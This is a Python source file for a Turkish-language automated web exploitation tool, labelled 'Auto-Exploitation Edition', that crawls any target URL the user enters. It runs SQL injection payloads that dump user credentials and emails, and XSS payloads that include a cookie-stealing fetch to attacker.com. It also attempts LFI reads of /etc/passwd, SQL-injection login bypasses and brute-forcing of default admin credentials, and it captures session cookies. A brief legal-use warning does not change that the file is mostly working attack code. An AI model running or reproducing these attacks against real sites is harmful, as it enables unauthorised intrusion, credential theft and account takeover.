import requests
import re
import json
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ANSI Renk Kodları
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_ascii_art():
    art = f"""{Colors.CYAN}
╔══════════════════════════════════════════════════════════════════════════════                                       
║                                                                                                                     
║  {Colors.BOLD}██████╗ ██████╗ ███████╗███╗   ██╗████████╗███████╗{Colors.RESET}{Colors.CYAN}                        
║  {Colors.BOLD}██╔══██╗██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝{Colors.RESET}{Colors.CYAN}                        
║  {Colors.BOLD}██████╔╝██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗{Colors.RESET}{Colors.CYAN}                          
║  {Colors.BOLD}██╔═══╝ ██╔══██╗██╔══╝  ██║╚██╗██║   ██║   ██╔══╝{Colors.RESET}{Colors.CYAN}                          
║  {Colors.BOLD}██║     ██║  ██║███████╗██║ ╚████║   ██║   ███████╗{Colors.RESET}{Colors.CYAN}                        
║  {Colors.BOLD}╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝{Colors.RESET}{Colors.CYAN}                        
║                                                                                                                    
║  {Colors.BOLD}███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗{Colors.RESET}{Colors.CYAN}                
║  {Colors.BOLD}██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗{Colors.RESET}{Colors.CYAN}               
║  {Colors.BOLD}███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝{Colors.RESET}{Colors.CYAN}              
║  {Colors.BOLD}╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗{Colors.RESET}{Colors.CYAN}               
║  {Colors.BOLD}███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║{Colors.RESET}{Colors.CYAN}               
║  {Colors.BOLD}╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{Colors.RESET}{Colors.CYAN}               
║                               {Colors.BOLD}Medium Version{Colors.RESET}                                                                                     
║  {Colors.YELLOW}═══════════════════════════════════════════════════════════════════════{Colors.RESET}{Colors.CYAN}  
║                                                                                                                     
║  {Colors.GREEN}[+] Advanced Web Application Security Testing & Exploitation{Colors.RESET}{Colors.CYAN}              
║  {Colors.GREEN}[+] Version 4.0 - Auto-Exploitation Edition{Colors.RESET}{Colors.CYAN}                               
║  {Colors.GREEN}[+] Telegram: @IIIlIIIIlIIlIIIIlI{Colors.RESET}{Colors.CYAN}                                         
║  {Colors.GREEN}[+] Developed for Ethical Penetration Testing{Colors.RESET}{Colors.CYAN}                             
║                                                                                                                     
╚══════════════════════════════════════════════════════════════════════════════                                       
{Colors.RESET}"""
    print(art)

class AutoExploiter:
    def __init__(self, target_url, verbose=False):
        self.target_url = target_url
        self.verbose = verbose
        self.vulnerabilities = []
        self.exploited = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": Colors.BLUE,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "VULN": Colors.MAGENTA,
            "EXPLOIT": Colors.RED + Colors.BOLD
        }
        color = colors.get(level, Colors.WHITE)
        print(f"{color}[{timestamp}] [{level}] {message}{Colors.RESET}")
    
    def add_vulnerability(self, vuln_type, severity, description, url):
        self.vulnerabilities.append({
            'type': vuln_type,
            'severity': severity,
            'description': description,
            'url': url,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
    
    def add_exploit(self, vuln_type, method, payload, result):
        self.exploited.append({
            'type': vuln_type,
            'method': method,
            'payload': payload,
            'result': result,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
    # Crawl the website to find vulnerable parameters
    def crawl_site(self, max_pages=50):
        self.log("Web sitesi taranıyor ve parametreler tespit ediliyor...", "INFO")
        visited = set()
        to_visit = [self.target_url]
        vulnerable_urls = []
        
        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            if url in visited:
                continue
            
            visited.add(url)
            try:
                response = self.session.get(url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Check for parameters in URL
                parsed = urlparse(url)
                if parsed.query:
                    vulnerable_urls.append(url)
                    self.log(f"Parametreli URL bulundu: {url}", "SUCCESS")
                
                # Find links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    
                    if urlparse(full_url).netloc == urlparse(self.target_url).netloc:
                        if full_url not in visited:
                            to_visit.append(full_url)
            except:
                continue
        
        self.log(f"Toplam {len(visited)} sayfa tarandı, {len(vulnerable_urls)} parametreli URL bulundu", "INFO")
        return vulnerable_urls
    
    # SQL Injection - Detection & Exploitation
    def exploit_sql_injection(self, urls=None):
        self.log("SQL Injection taraması ve exploitation başlatılıyor...", "INFO")
        
        if not urls:
            urls = self.crawl_site()
        
        sql_payloads = [
            ("'", "error", "Single Quote Test"),
            ("' OR '1'='1", "bypass", "OR Bypass"),
            ("' OR 1=1--", "bypass", "Comment Bypass"),
            ("' UNION SELECT NULL--", "union", "Union NULL"),
            ("' UNION SELECT NULL,NULL--", "union", "Union 2 Columns"),
            ("' UNION SELECT NULL,NULL,NULL--", "union", "Union 3 Columns"),
            ("' UNION SELECT NULL,NULL,NULL,NULL--", "union", "Union 4 Columns"),
            ("' UNION SELECT version(),database(),user()--", "extract", "MySQL Info Extraction"),
            ("' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", "tables", "Table Enumeration"),
            ("' UNION SELECT column_name,NULL,NULL FROM information_schema.columns--", "columns", "Column Enumeration"),
        ]
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                self.log(f"Parametre test ediliyor: {param}", "INFO")
                
                for payload, check_type, desc in sql_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    try:
                        response = self.session.get(test_url, timeout=10)
                        
                        # Error-based detection
                        if check_type == "error":
                            error_patterns = [
                                r"SQL syntax.*MySQL",
                                r"Warning.*mysql",
                                r"PostgreSQL.*ERROR",
                                r"Microsoft SQL",
                                r"ORA-\d+",
                                r"syntax error"
                            ]
                            
                            for pattern in error_patterns:
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    self.log(f"SQL Injection BULUNDU! - {desc}", "EXPLOIT")
                                    self.add_vulnerability("SQL Injection", "CRITICAL", desc, test_url)
                                    self.add_exploit("SQL Injection", "Error-Based", payload, "SQL Error Detected")
                                    
                                    # Try to extract data
                                    self.extract_sql_data(url, param)
                                    return True
                        
                        # Union-based detection
                        elif check_type == "union":
                            if "NULL" not in response.text and len(response.text) > len(self.session.get(url).text):
                                self.log(f"UNION SQL Injection mümkün! - {desc}", "EXPLOIT")
                                self.add_vulnerability("SQL Injection", "CRITICAL", desc, test_url)
                                self.add_exploit("SQL Injection", "Union-Based", payload, "Union query successful")
                        
                        # Data extraction
                        elif check_type == "extract":
                            if re.search(r'\d+\.\d+\.\d+', response.text):  # Version pattern
                                self.log(f"VERİ ÇIKARIMI BAŞARILI! Database bilgileri alındı", "EXPLOIT")
                                
                                # Extract visible data
                                soup = BeautifulSoup(response.text, 'html.parser')
                                data_found = soup.get_text()[:500]
                                
                                self.add_exploit("SQL Injection", "Data Extraction", payload, data_found)
                                self.log(f"Çıkarılan veri önizlemesi:\n{data_found}", "SUCCESS")
                                return True
                        
                        # Table enumeration
                        elif check_type == "tables":
                            tables = re.findall(r'[a-zA-Z_][a-zA-Z0-9_]+', response.text)
                            if tables:
                                self.log(f"TABLO İSİMLERİ ÇIKARILDI: {', '.join(tables[:10])}", "EXPLOIT")
                                self.add_exploit("SQL Injection", "Table Enumeration", payload, str(tables[:10]))
                        
                    except Exception as e:
                        if self.verbose:
                            self.log(f"Test hatası: {e}", "ERROR")
        
        self.log("SQL Injection zafiyeti tespit edilmedi", "SUCCESS")
        return False
    
    def extract_sql_data(self, url, param):
        """Extract database information using SQL injection"""
        self.log("Veritabanı bilgileri çıkarılıyor...", "INFO")
        
        extraction_payloads = [
            ("' UNION SELECT version(),database(),user(),NULL--", "DB Info"),
            ("' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--", "Tables"),
            ("' UNION SELECT CONCAT(username,':',password),NULL,NULL,NULL FROM users--", "User Credentials"),
            ("' UNION SELECT email,password,NULL,NULL FROM users LIMIT 5--", "User Data"),
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for payload, desc in extraction_payloads:
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                if response.status_code == 200:
                    self.log(f"✓ {desc} extraction deneniyor...", "INFO")
                    
                    # Look for patterns
                    emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', response.text)
                    hashes = re.findall(r'[a-fA-F0-9]{32,64}', response.text)
                    
                    if emails:
                        self.log(f"EMAIL ADRESLERİ BULUNDU: {', '.join(emails[:5])}", "EXPLOIT")
                        self.add_exploit("SQL Injection", desc, payload, f"Emails: {emails[:5]}")
                    
                    if hashes:
                        self.log(f"HASH'LER BULUNDU: {', '.join(hashes[:3])}", "EXPLOIT")
                        self.add_exploit("SQL Injection", desc, payload, f"Hashes: {hashes[:3]}")
                        
            except:
                continue
    
    # XSS - Detection & Exploitation
    def exploit_xss(self, urls=None):
        self.log("XSS taraması ve exploitation başlatılıyor...", "INFO")
        
        if not urls:
            urls = self.crawl_site()
        
        xss_payloads = [
            ("<script>alert('XSS')</script>", "Script Tag"),
            ("<img src=x onerror=alert('XSS')>", "IMG Onerror"),
            ("<svg/onload=alert('XSS')>", "SVG Onload"),
            ("<iframe src='javascript:alert(1)'>", "Iframe Javascript"),
            ("javascript:alert(document.cookie)", "Cookie Theft"),
            ("<script>fetch('http://attacker.com?c='+document.cookie)</script>", "Cookie Exfil"),
        ]
        
        for url in urls:
            try:
                response = self.session.get(url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    form_details = self.get_form_details(form)
                    
                    for payload, desc in xss_payloads:
                        data = {}
                        for input_tag in form_details["inputs"]:
                            if input_tag["type"] in ["text", "search", "email"]:
                                data[input_tag["name"]] = payload
                            else:
                                data[input_tag["name"]] = "test"
                        
                        form_url = urljoin(url, form_details["action"])
                        
                        try:
                            if form_details["method"] == "post":
                                res = self.session.post(form_url, data=data, timeout=10)
                            else:
                                res = self.session.get(form_url, params=data, timeout=10)
                            
                            if payload in res.text:
                                self.log(f"XSS ZAFİYETİ BULUNDU VE EXPLOIT EDİLDİ! - {desc}", "EXPLOIT")
                                self.add_vulnerability("XSS", "HIGH", desc, form_url)
                                self.add_exploit("XSS", "Reflected", payload, "Payload reflected in response")
                                
                                # Show where it was reflected
                                soup_resp = BeautifulSoup(res.text, 'html.parser')
                                self.log(f"Payload yansıtıldı: {form_url}", "SUCCESS")
                                return True
                        except:
                            continue
            except:
                continue
        
        # Also test URL parameters
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload, desc in xss_payloads[:3]:  # Test first 3 payloads
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    try:
                        response = self.session.get(test_url, timeout=10)
                        if payload in response.text:
                            self.log(f"URL-based XSS BULUNDU! - {desc}", "EXPLOIT")
                            self.add_vulnerability("XSS", "HIGH", desc, test_url)
                            self.add_exploit("XSS", "URL Parameter", payload, "Reflected in response")
                            return True
                    except:
                        continue
        
        self.log("XSS zafiyeti tespit edilmedi", "SUCCESS")
        return False
    
    # LFI/RFI - Detection & Exploitation
    def exploit_file_inclusion(self, urls=None):
        self.log("File Inclusion taraması ve exploitation başlatılıyor...", "INFO")
        
        if not urls:
            urls = self.crawl_site()
        
        lfi_payloads = [
            ("../../../../etc/passwd", "root:", "Linux Passwd"),
            ("../../../../etc/hosts", "localhost", "Linux Hosts"),
            ("../../../../proc/version", "Linux version", "Kernel Version"),
            ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA", "PHP Filter"),
            ("/etc/passwd", "root:", "Direct Path"),
        ]
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                if any(keyword in param.lower() for keyword in ['file', 'page', 'include', 'path', 'doc']):
                    self.log(f"Şüpheli parametre test ediliyor: {param}", "INFO")
                    
                    for payload, signature, desc in lfi_payloads:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                        
                        try:
                            response = self.session.get(test_url, timeout=10)
                            if signature in response.text:
                                self.log(f"LFI ZAFİYETİ BULUNDU VE EXPLOIT EDİLDİ! - {desc}", "EXPLOIT")
                                self.add_vulnerability("LFI", "CRITICAL", desc, test_url)
                                
                                # Extract first 500 chars of file content
                                content = response.text[:500]
                                self.add_exploit("LFI", "File Read", payload, content)
                                self.log(f"Dosya içeriği önizlemesi:\n{content}", "SUCCESS")
                                return True
                        except:
                            continue
        
        self.log("File Inclusion zafiyeti tespit edilmedi", "SUCCESS")
        return False
    
    # Admin Panel Discovery
    def find_admin_panel(self):
        self.log("Admin paneli aranıyor...", "INFO")
        
        admin_paths = [
            '/admin', '/admin/', '/administrator', '/admin.php', '/admin.html',
            '/login', '/login/', '/login.php', '/signin', '/signin.php',
            '/admin/login', '/admin/login.php', '/administrator/login.php',
            '/wp-admin', '/wp-login.php', '/administrator.php',
            '/admin/index.php', '/admin/admin.php', '/admincp',
            '/modcp', '/admincp.php', '/moderator.php',
            '/admin1', '/admin2', '/admin3', '/admin4',
            '/admins', '/admins/', '/cpanel', '/cpanel/',
            '/controlpanel', '/controlpanel/', '/admincontrol',
            '/admin_area', '/admin_area/', '/adminarea',
            '/bb-admin', '/admin_login.php', '/admin_login.html',
            '/adminLogin', '/admin-login', '/panel-administracion',
            '/instadmin', '/memberadmin', '/administratorlogin',
            '/adm', '/adm/', '/admin/account.php', '/admin/index.html',
            '/admin/login.html', '/admin/home.php', '/admin_area/admin.php',
            '/admin_area/login.php', '/siteadmin/login.php', '/siteadmin/index.php',
            '/admin/account.html', '/admin/index.php', '/admin_area/index.php',
            '/bb-admin/index.php', '/bb-admin/login.php', '/bb-admin/admin.php',
            '/admin/home.html', '/admin/controlpanel.php', '/admin.html',
            '/admin/cp.php', '/cp.php', '/administrator/', '/administrator/index.html',
            '/administrator/login.html', '/user.html', '/administrator/account.html',
            '/administrator.html', '/login.html', '/modelsearch/login.php',
            '/moderator.html', '/administrator/login.php', '/user.php',
            '/moderator.php', '/yonetim.php', '/yonetici.php', '/admin_panel.php',
            '/admin_panel/', '/panel', '/panel/', '/dashboard', '/dashboard/',
        ]
        
        found_panels = []
        
        for path in admin_paths:
            test_url = urljoin(self.target_url, path)
            try:
                response = self.session.get(test_url, timeout=5, allow_redirects=True)
                
                # Check for login indicators
                if response.status_code == 200:
                    indicators = [
                        'login', 'password', 'username', 'admin', 'sign in',
                        'user', 'pass', 'authentication', 'credentials'
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in indicators):
                        self.log(f"ADMİN PANELİ BULUNDU: {test_url}", "EXPLOIT")
                        found_panels.append(test_url)
                        self.add_vulnerability("Admin Panel Exposed", "MEDIUM", f"Publicly accessible: {path}", test_url)
                        
            except:
                continue
        
        if found_panels:
            self.log(f"Toplam {len(found_panels)} admin paneli bulundu!", "SUCCESS")
            return found_panels
        else:
            self.log("Admin paneli bulunamadı", "WARNING")
            return []
    
    # Brute Force Admin Credentials
    def brute_force_admin(self, admin_urls=None):
        self.log("Admin paneli brute force başlatılıyor...", "INFO")
        
        if not admin_urls:
            admin_urls = self.find_admin_panel()
        
        if not admin_urls:
            self.log("Brute force için admin paneli bulunamadı", "WARNING")
            return False
        
        # Common username/password combinations
        credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '12345'),
            ('admin', 'admin123'),
            ('administrator', 'administrator'),
            ('administrator', 'password'),
            ('root', 'root'),
            ('root', 'toor'),
            ('admin', '123456'),
            ('admin', 'admin1'),
            ('admin', '1234'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('user', 'user'),
            ('admin', ''),
            ('', 'admin'),
            ('admin', 'pass'),
            ('admin', 'letmein'),
            ('admin', 'welcome'),
            ('admin', 'qwerty'),
            ('admin', '123'),
            ('demo', 'demo'),
            ('webadmin', 'webadmin'),
            ('sysadmin', 'sysadmin'),
            ('netadmin', 'netadmin'),
        ]
        
        # SQL Injection bypass payloads
        sql_bypasses = [
            ("admin' OR '1'='1", "anything"),
            ("' OR 1=1--", "anything"),
            ("admin'--", "anything"),
            ("admin' #", "anything"),
            ("' OR '1'='1' --", "anything"),
            ("admin' OR 1=1--", "anything"),
            ("' or 1=1 limit 1 -- -+", "anything"),
            ("'or 1=1 or ''='", "anything"),
            ("' or 1=1--", "anything"),
            ("admin' /*", "anything"),
        ]
        
        for admin_url in admin_urls:
            self.log(f"Brute force deneniyor: {admin_url}", "INFO")
            
            try:
                response = self.session.get(admin_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    form_details = self.get_form_details(form)
                    form_url = urljoin(admin_url, form_details["action"])
                    
                    # Find username and password fields
                    username_field = None
                    password_field = None
                    
                    for input_tag in form_details["inputs"]:
                        input_name = input_tag["name"]
                        input_type = input_tag["type"]
                        
                        if input_name and ('user' in input_name.lower() or 'email' in input_name.lower() or 'login' in input_name.lower()):
                            username_field = input_name
                        elif input_type == "password":
                            password_field = input_name
                    
                    if not username_field or not password_field:
                        self.log("Username veya password alanı bulunamadı", "WARNING")
                        continue
                    
                    self.log(f"Login form bulundu - User field: {username_field}, Pass field: {password_field}", "INFO")
                    
                    # Try SQL Injection first
                    self.log("SQL Injection bypass deneniyor...", "INFO")
                    for username, password in sql_bypasses:
                        data = {}
                        for input_tag in form_details["inputs"]:
                            if input_tag["name"] == username_field:
                                data[input_tag["name"]] = username
                            elif input_tag["name"] == password_field:
                                data[input_tag["name"]] = password
                            else:
                                data[input_tag["name"]] = "test"
                        
                        try:
                            if form_details["method"] == "post":
                                res = self.session.post(form_url, data=data, timeout=10, allow_redirects=True)
                            else:
                                res = self.session.get(form_url, params=data, timeout=10, allow_redirects=True)
                            
                            # Check for successful login
                            success_indicators = [
                                'welcome', 'dashboard', 'logout', 'profile', 
                                'successful', 'admin panel', 'control panel',
                                'administration', 'management', 'settings'
                            ]
                            
                            fail_indicators = [
                                'incorrect', 'invalid', 'wrong', 'failed',
                                'error', 'denied', 'try again'
                            ]
                            
                            response_lower = res.text.lower()
                            
                            has_success = any(indicator in response_lower for indicator in success_indicators)
                            has_fail = any(indicator in response_lower for indicator in fail_indicators)
                            
                            if has_success and not has_fail:
                                self.log(f"SQL INJECTION BYPASS BAŞARILI! Username: {username}", "EXPLOIT")
                                self.add_vulnerability("Admin Auth Bypass", "CRITICAL", f"SQL Injection - User: {username}", form_url)
                                self.add_exploit("Admin Login", "SQL Injection Bypass", f"{username} / {password}", "Login successful")
                                
                                # Try to extract session cookies
                                cookies = self.session.cookies.get_dict()
                                if cookies:
                                    self.log(f"Session cookies: {cookies}", "SUCCESS")
                                    self.add_exploit("Session", "Cookie Extraction", str(cookies), "Valid session obtained")
                                
                                return True
                        except:
                            continue
                    
                    # Try common credentials
                    self.log("Yaygın credential'lar deneniyor...", "INFO")
                    attempt_count = 0
                    
                    for username, password in credentials:
                        attempt_count += 1
                        
                        if attempt_count % 5 == 0:
                            self.log(f"Deneme sayısı: {attempt_count}/{len(credentials)}", "INFO")
                            time.sleep(1)  # Rate limiting
                        
                        data = {}
                        for input_tag in form_details["inputs"]:
                            if input_tag["name"] == username_field:
                                data[input_tag["name"]] = username
                            elif input_tag["name"] == password_field:
                                data[input_tag["name"]] = password
                            else:
                                data[input_tag["name"]] = "test"
                        
                        try:
                            if form_details["method"] == "post":
                                res = self.session.post(form_url, data=data, timeout=10, allow_redirects=True)
                            else:
                                res = self.session.get(form_url, params=data, timeout=10, allow_redirects=True)
                            
                            response_lower = res.text.lower()
                            
                            success_indicators = [
                                'welcome', 'dashboard', 'logout', 'profile', 
                                'successful', 'admin panel', 'control panel',
                                'administration', 'management'
                            ]
                            
                            fail_indicators = [
                                'incorrect', 'invalid', 'wrong', 'failed',
                                'error', 'denied'
                            ]
                            
                            has_success = any(indicator in response_lower for indicator in success_indicators)
                            has_fail = any(indicator in response_lower for indicator in fail_indicators)
                            
                            if has_success and not has_fail:
                                self.log(f"GİRİŞ BAŞARILI! Username: {username}, Password: {password}", "EXPLOIT")
                                self.add_vulnerability("Weak Credentials", "CRITICAL", f"Default credentials work", form_url)
                                self.add_exploit("Admin Login", "Brute Force", f"{username} / {password}", "Login successful with weak credentials")
                                
                                # Extract cookies
                                cookies = self.session.cookies.get_dict()
                                if cookies:
                                    self.log(f"Session cookies: {cookies}", "SUCCESS")
                                
                                return True
                            
                        except Exception as e:
                            if self.verbose:
                                self.log(f"Login denemesi hatası: {e}", "ERROR")
                            continue
                    
            except Exception as e:
                if self.verbose:
                    self.log(f"Form parsing hatası: {e}", "ERROR")
                continue
        
        self.log("Brute force başarısız - geçerli credential bulunamadı", "WARNING")
        return False
    
    def get_form_details(self, form):
        details = {}
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            if input_name:
                inputs.append({"type": input_type, "name": input_name})
        
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details
    
    def generate_report(self):
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.YELLOW}                    EXPLOITATION RAPORU                     {Colors.RESET}")
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}\n")
        
        print(f"{Colors.BOLD}Hedef URL:{Colors.RESET} {self.target_url}")
        print(f"{Colors.BOLD}Tarih:{Colors.RESET} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Colors.BOLD}Toplam Zafiyet:{Colors.RESET} {len(self.vulnerabilities)}")
        print(f"{Colors.BOLD}Başarılı Exploit:{Colors.RESET} {len(self.exploited)}\n")
        
        if self.exploited:
            print(f"{Colors.RED}{Colors.BOLD}{'='*80}")
            print(f"                    BAŞARILI EXPLOITATION'LAR")
            print(f"{'='*80}{Colors.RESET}\n")
            
            for i, exploit in enumerate(self.exploited, 1):
                print(f"{Colors.MAGENTA}[{i}] {exploit['type']} - {exploit['method']}{Colors.RESET}")
                print(f"    Payload: {exploit['payload'][:100]}")
                print(f"    Sonuç: {exploit['result'][:200]}")
                print()
        
        if self.vulnerabilities:
            print(f"{Colors.YELLOW}{Colors.BOLD}{'='*80}")
            print(f"                    TESPİT EDİLEN ZAFİYETLER")
            print(f"{'='*80}{Colors.RESET}\n")
            
            critical = [v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']
            high = [v for v in self.vulnerabilities if v['severity'] == 'HIGH']
            medium = [v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']
            low = [v for v in self.vulnerabilities if v['severity'] == 'LOW']
            
            if critical:
                print(f"{Colors.RED}{Colors.BOLD}[CRITICAL] - {len(critical)} zafiyet{Colors.RESET}")
                for v in critical:
                    print(f"  • {v['type']}: {v['description']}")
            
            if high:
                print(f"\n{Colors.MAGENTA}{Colors.BOLD}[HIGH] - {len(high)} zafiyet{Colors.RESET}")
                for v in high:
                    print(f"  • {v['type']}: {v['description']}")
            
            if medium:
                print(f"\n{Colors.YELLOW}{Colors.BOLD}[MEDIUM] - {len(medium)} zafiyet{Colors.RESET}")
                for v in medium:
                    print(f"  • {v['type']}: {v['description']}")
            
            if low:
                print(f"\n{Colors.BLUE}{Colors.BOLD}[LOW] - {len(low)} zafiyet{Colors.RESET}")
                for v in low:
                    print(f"  • {v['type']}: {v['description']}")
        
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}\n")
        
        # JSON export
        if self.vulnerabilities or self.exploited:
            save = input(f"{Colors.YELLOW}Detaylı raporu JSON olarak kaydetmek ister misiniz? (e/h): {Colors.RESET}").lower()
            if save == 'e':
                filename = f"exploitation_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                report = {
                    'target': self.target_url,
                    'vulnerabilities': self.vulnerabilities,
                    'exploits': self.exploited,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(report, f, indent=4, ensure_ascii=False)
                print(f"{Colors.GREEN}✓ Rapor kaydedildi: {filename}{Colors.RESET}\n")
    
    def run_auto_exploitation(self):
        print(f"\n{Colors.RED}{Colors.BOLD}{'='*80}")
        print("              OTOMATIK EXPLOITATION BAŞLATILIYOR")
        print(f"{'='*80}{Colors.RESET}\n")
        
        # Phase 1: Reconnaissance
        self.log("PHASE 1: Reconnaissance & Crawling", "INFO")
        urls = self.crawl_site(max_pages=30)
        time.sleep(1)
        
        # Phase 2: Admin Panel Discovery
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
        self.log("PHASE 2: Admin Panel Discovery", "INFO")
        admin_panels = self.find_admin_panel()
        time.sleep(1)
        
        # Phase 3: Admin Brute Force
        if admin_panels:
            print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
            self.log("PHASE 3: Admin Credential Brute Force", "INFO")
            self.brute_force_admin(admin_panels)
            time.sleep(1)
        
        # Phase 4: SQL Injection
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
        self.log("PHASE 4: SQL Injection Attack", "INFO")
        self.exploit_sql_injection(urls)
        time.sleep(1)
        
        # Phase 5: XSS
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
        self.log("PHASE 5: XSS Attack", "INFO")
        self.exploit_xss(urls)
        time.sleep(1)
        
        # Phase 6: LFI/RFI
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
        self.log("PHASE 6: File Inclusion Attack", "INFO")
        self.exploit_file_inclusion(urls)
        
        # Generate Report
        self.generate_report()

def main():
    print_ascii_art()
    
    print(f"\n{Colors.RED}{Colors.BOLD}{'='*80}")
    print("⚠️  UYARI: Bu araç sadece yasal test sitelerinde kullanılmalıdır!")
    print("⚠️  Örnek: http://testphp.vulnweb.com/")
    print("⚠️  Yetkisiz kullanım yasadışıdır ve cezai yaptırım içerebilir.")
    print(f"{'='*80}{Colors.RESET}\n")
    
    target_url = input(f"{Colors.CYAN}Hedef URL'yi girin (örn: http://testphp.vulnweb.com): {Colors.RESET}").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        print(f"{Colors.RED}[!] Geçerli bir URL girin (http:// veya https:// ile başlamalı){Colors.RESET}")
        return
    
    print(f"\n{Colors.YELLOW}Mod seçin:{Colors.RESET}")
    print(f"{Colors.GREEN}1. Sadece Tarama (Scan Only){Colors.RESET}")
    print(f"{Colors.RED}2. Otomatik Exploitation (Auto-Exploit){Colors.RESET}")
    
    mode = input(f"\n{Colors.CYAN}Seçiminiz (1/2): {Colors.RESET}").strip()
    
    verbose = input(f"{Colors.CYAN}Detaylı çıktı ister misiniz? (e/h): {Colors.RESET}").lower() == 'e'
    
    exploiter = AutoExploiter(target_url, verbose=verbose)
    
    print(f"\n{Colors.GREEN}[*] Hedef: {target_url}{Colors.RESET}")
    print(f"{Colors.GREEN}[*] İşlem başlatılıyor...{Colors.RESET}\n")
    
    start_time = time.time()
    
    if mode == "2":
        exploiter.run_auto_exploitation()
    else:
        # Basic scanning mode
        urls = exploiter.crawl_site(max_pages=20)
        exploiter.exploit_sql_injection(urls)
        exploiter.exploit_xss(urls)
        exploiter.exploit_file_inclusion(urls)
        exploiter.generate_report()
    
    end_time = time.time()
    
    print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
    print(f"{Colors.GREEN}[*] İşlem tamamlandı - Süre: {end_time - start_time:.2f} saniye{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*80}{Colors.RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] İşlem kullanıcı tarafından durduruldu{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Beklenmeyen bir hata oluştu: {e}{Colors.RESET}")